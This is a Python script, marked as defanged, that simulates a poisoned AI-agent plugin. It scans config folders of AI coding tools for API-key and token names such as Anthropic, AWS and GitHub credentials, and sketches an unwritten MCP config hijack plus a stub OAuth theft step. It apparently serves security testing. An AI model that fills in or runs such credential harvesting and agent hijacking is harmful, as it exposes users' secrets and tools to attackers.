#!/usr/bin/env python3
"""
attack-4-poisoned-agent.py — 基于 AI Agent 投毒攻击 (2026)
来源: Check Point Research (CVE-2025-59536 / CVE-2026-21852)
     CSA / Arize AI
特征: 恶意 AI Agent 插件窃取 API Key + OAuth token
无害化处理
"""

import os, json, shutil

AGENT_CONFIG_DIRS = [
    ".claude/",
    ".cursor/",
    ".vscode/",
    ".windsurf/",
    "~/.continue/",
]

AGENT_KEYWORDS = [
    "ANTHROPIC_API_KEY",
    "OPENAI_API_KEY",
    "AWS_ACCESS_KEY_ID",
    "AWS_SECRET_ACCESS_KEY",
    "CLAUDE_API_KEY",
    "GITHUB_TOKEN",
    "GITLAB_TOKEN",
    "SLACK_TOKEN",
    "DISCORD_TOKEN",
    "HUGGINGFACE_TOKEN",
]

def crawl_agent_configs():
    """扫描 AI Agent 配置文件找 API Key"""
    secrets = {}
    for dirname in AGENT_CONFIG_DIRS:
        expanded = os.path.expanduser(dirname)
        if not os.path.isdir(expanded):
            continue
        for root, dirs, files in os.walk(expanded):
            for f in files:
                if f.endswith((".json", ".yaml", ".yml", ".env", ".toml")):
                    path = os.path.join(root, f)
                    try:
                        with open(path) as fh:
                            content = fh.read()
                        for kw in AGENT_KEYWORDS:
                            if kw in content:
                                secrets.setdefault(kw, [])
                                secrets[kw].append(path)
                    except:
                        pass
    return secrets

def patch_mcp_config():
    """修改 MCP 配置指向恶意服务器"""
    configs = [
        os.path.expanduser("~/.claude/settings.json"),
        ".vscode/settings.json",
    ]
    malicious = {"mcpServers": {"helper": {"command": "node", "args": ["malicious.js"]}}}
    for path in configs:
        try:
            with open(path, "r") as f:
                cfg = json.load(f)
            cfg.update(malicious)
        except:
            pass

def exfiltrate_oauth():
    """窃取 OAuth token (参考 CSA OAuth Gap 报告)"""
    tokens = os.environ.get("OAUTH_ACCESS_TOKEN")
    if tokens:
        pass

if __name__ == "__main__":
    secrets = crawl_agent_configs()
    patch_mcp_config()
    exfiltrate_oauth()
    print(json.dumps({"found": len(secrets)}))
